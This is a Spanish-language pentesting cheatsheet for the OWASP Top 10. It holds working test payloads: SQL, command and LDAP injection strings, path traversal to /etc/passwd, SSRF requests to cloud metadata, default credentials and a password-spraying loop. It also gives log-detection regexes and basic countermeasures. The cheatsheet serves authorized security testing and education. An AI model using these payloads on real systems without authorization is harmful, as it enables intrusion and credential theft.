#  CHEATSHEET DE VULNERABILIDADES WEB

## ** OWASP TOP 10 2021**

### **1. Broken Access Control (A01:2021)**

#### **Descripción**
Control de acceso defectuoso que permite a usuarios actuar fuera de permisos.

#### **Tipos Comunes**
- **IDOR (Insecure Direct Object Reference)**
- **Path Traversal**
- **Privilege Escalation**
- **Missing Access Control**

#### **Detección Manual**
```bash
# Test IDOR básico
curl -H "Cookie: session=user_token" http://target/user/profile?id=1234
curl -H "Cookie: session=user_token" http://target/user/profile?id=1235

# Test Path Traversal
curl "http://target/download?file=../../../etc/passwd"
curl "http://target/download?file=....//....//etc/passwd"

# Test función admin sin autenticación
curl http://target/admin/users
curl http://target/admin/delete?id=123
```

#### **Payloads de Prueba**
```
# IDOR
/user/1 -> /user/2
/account/123 -> /account/124
/order/abc -> /order/xyz

# Path Traversal
../../../etc/passwd
....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd

# Bypass de autorización
/admin/../user/panel
/admin%2f../user/panel
```

### **2. Cryptographic Failures (A02:2021)**

#### **Detección de Cifrado Débil**
```bash
# Test SSL/TLS
echo | openssl s_client -connect target:443 2>/dev/null | grep -E "Protocol|Cipher"

# Verificar headers de seguridad
curl -I https://target.com | grep -E "(Strict-Transport|X-Frame|X-Content)"

# Test de cifrados débiles
nmap --script ssl-enum-ciphers -p 443 target
```

#### **Indicadores de Falla**
- Uso de HTTP en lugar de HTTPS
- Certificados autofirmados
- Algoritmos MD5 o SHA1
- Claves de cifrado hardcodeadas
- Almacenamiento de contraseñas en texto plano

### **3. Injection (A03:2021)**

#### **SQL Injection**
```bash
# Detección básica
' OR '1'='1
'; WAITFOR DELAY '00:00:05'; --
' UNION SELECT NULL,NULL,NULL --

# Time-based
'; IF (1=1) WAITFOR DELAY '00:00:05' --
' OR SLEEP(5) --

# Boolean-based
' AND 1=1 --
' AND 1=2 --

# Union-based
' UNION SELECT username,password FROM users --
' UNION SELECT version(),database(),user() --
```

#### **Command Injection**
```bash
# Separadores de comandos
; ls
| ls
& ls
&& ls
|| ls

# Payloads comunes
127.0.0.1; cat /etc/passwd
127.0.0.1 && id
127.0.0.1 | whoami
```

#### **LDAP Injection**
```bash
# Bypass autenticación
*)(uid=*))(|(uid=*
*)(cn=*))(|(cn=*

# Enumeración
*)(objectClass=user)
*)(sAMAccountName=*)
```

### **4. Insecure Design (A04:2021)**

#### **Indicadores**
- Falta de rate limiting
- Ausencia de CAPTCHA
- Validación solo del lado cliente
- Funcionalidad de "recordar contraseña" insegura

#### **Tests**
```bash
# Rate limiting test
for i in {1..100}; do 
    curl -d "user=admin&pass=test$i" http://target/login
done

# Business logic flaws
curl -d "price=-100&item=laptop" http://target/purchase
curl -d "quantity=-5&product=123" http://target/cart/add
```

### **5. Security Misconfiguration (A05:2021)**

#### **Detección Automática**
```bash
# Información del servidor
curl -I http://target | grep Server
curl -I http://target | grep X-Powered-By

# Directorios expuestos
curl http://target/.git/config
curl http://target/.env
curl http://target/backup/
curl http://target/admin/

# Archivos sensibles
curl http://target/robots.txt
curl http://target/sitemap.xml
curl http://target/.htaccess
```

#### **Headers de Seguridad**
```bash
# Verificar headers faltantes
curl -I https://target.com | grep -E "(Content-Security-Policy|X-Frame-Options|X-Content-Type-Options)"
```

### **6. Vulnerable Components (A06:2021)**

#### **Detección de Versiones**
```bash
# CMS Detection
curl -s http://target | grep -i "wordpress\|drupal\|joomla"
curl -s http://target/wp-content/themes/
curl -s http://target/sites/default/files/

# JavaScript Libraries
curl -s http://target | grep -E "jquery|bootstrap|angular" | grep -o 'version.*[0-9]\+\.[0-9]\+'

# Framework Detection
curl -I http://target | grep -E "X-Powered-By|Server"
```

### **7. Authentication Failures (A07:2021)**

#### **Tests de Autenticación Débil**
```bash
# Contraseñas comunes
admin:admin
admin:password
admin:123456
root:root
test:test

# Bypass de autenticación
' OR '1'='1
admin'--
admin'/*

# Password spraying
for user in admin root test; do
    for pass in password 123456 admin; do
        curl -d "user=$user&pass=$pass" http://target/login
    done
done
```

#### **Tests de Sesión**
```bash
# Session fixation
# 1. Obtener session ID sin autenticación
curl -c cookies.txt http://target/login

# 2. Autenticarse con el mismo session ID
curl -b cookies.txt -d "user=admin&pass=secret" http://target/login

# Session timeout
curl -H "Cookie: SESSIONID=old_session" http://target/protected
```

### **8. Software Integrity Failures (A08:2021)**

#### **Detección**
```bash
# Verificar integridad de recursos
curl -s http://target | grep -E "integrity=|crossorigin="

# CDN externos sin verificación
curl -s http://target | grep -o 'src="http[^"]*"' | grep -v target.com
```

### **9. Logging Failures (A09:2021)**

#### **Tests**
```bash
# Generar eventos que deberían loggearse
curl -d "user=admin&pass=wrongpass" http://target/login
curl http://target/admin/sensitive-action
curl "http://target/search?q=<script>alert('xss')</script>"

# Verificar si se registran
curl http://target/logs/ 2>/dev/null | grep -q "admin"
```

### **10. Server-Side Request Forgery (A10:2021)**

#### **Payloads SSRF**
```bash
# Localhost
http://localhost:80/
http://127.0.0.1:22/
http://0.0.0.0:3306/

# Bypass filters
http://127.1:80/
http://2130706433/ (decimal de 127.0.0.1)
http://017700000001/ (octal de 127.0.0.1)

# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
```

## **� HERRAMIENTAS DE DETECCIÓN NATIVAS**

### **Curl para Web Testing**
```bash
# Headers completos
curl -I -X GET http://target

# POST con datos
curl -d "param1=value1&param2=value2" http://target/form

# Cookies
curl -b "session=abc123" http://target/protected

# User agent personalizado
curl -A "Custom-Agent/1.0" http://target

# Seguir redirects
curl -L http://target

# Tiempo de respuesta
curl -w "@curl-format.txt" http://target
```

### **Netcat para Network Testing**
```bash
# Banner grabbing
echo "" | nc target 80
echo "GET / HTTP/1.0\r\n\r\n" | nc target 80

# Port scanning
nc -zv target 1-1000

# HTTP request manual
printf "GET / HTTP/1.1\r\nHost: target\r\n\r\n" | nc target 80
```

### **Grep para Log Analysis**
```bash
# Buscar patrones de ataque
grep -E "(union|select|script|alert)" access.log
grep "Failed password" auth.log
grep -E "40[1-4]|50[0-5]" access.log

# Análisis de IPs
awk '{print $1}' access.log | sort | uniq -c | sort -nr
```

## ** PATRONES DE DETECCIÓN**

### **Inyección SQL**
```regex
# Patrones en logs
\b(union|select|insert|update|delete|drop|exec|script)\b
'.*or.*'.*=.*'
\bundefined\b.*mysql
```

### **XSS**
```regex
# Patrones XSS
<script[^>]*>.*</script>
javascript:.*
on\w+\s*=
<img[^>]*onerror
<svg[^>]*onload
```

### **Path Traversal**
```regex
# Patrones path traversal
\.\./
\.\.\\/
%2e%2e%2f
%252e%252e%252f
```

### **Command Injection**
```regex
# Patrones command injection
[;&|`$()]
\b(cat|ls|ps|id|whoami|uname)\b
;.*\b(rm|mv|cp)\b
```

## ** CONTRAMEDIDAS BÁSICAS**

### **Input Validation**
```bash
# Validar entrada con regex
validate_input() {
    local input="$1"
    if [[ "$input" =~ ^[a-zA-Z0-9_-]+$ ]]; then
        echo "Valid input"
    else
        echo "Invalid input detected"
        return 1
    fi
}
```

### **Output Encoding**
```bash
# HTML encoding básico
html_encode() {
    local input="$1"
    echo "$input" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g; s/'"'"'/\&#x27;/g'
}
```

### **Rate Limiting básico**
```bash
# Control de rate limiting simple
check_rate_limit() {
    local ip="$1"
    local current_time=$(date +%s)
    local log_file="/tmp/rate_limit_$ip"
    
    if [[ -f "$log_file" ]]; then
        local last_request=$(cat "$log_file")
        local time_diff=$((current_time - last_request))
        
        if [[ $time_diff -lt 1 ]]; then
            echo "Rate limit exceeded"
            return 1
        fi
    fi
    
    echo "$current_time" > "$log_file"
    return 0
}
```

---

** NOTA ÉTICA**: Este cheatsheet es para uso educativo y pruebas de seguridad autorizadas únicamente. Siempre obtén permiso explícito antes de realizar pruebas en sistemas que no sean de tu propiedad.

** Ares Aegis** - Herramientas para Expertos en Ciberseguridad y Hacking Ético
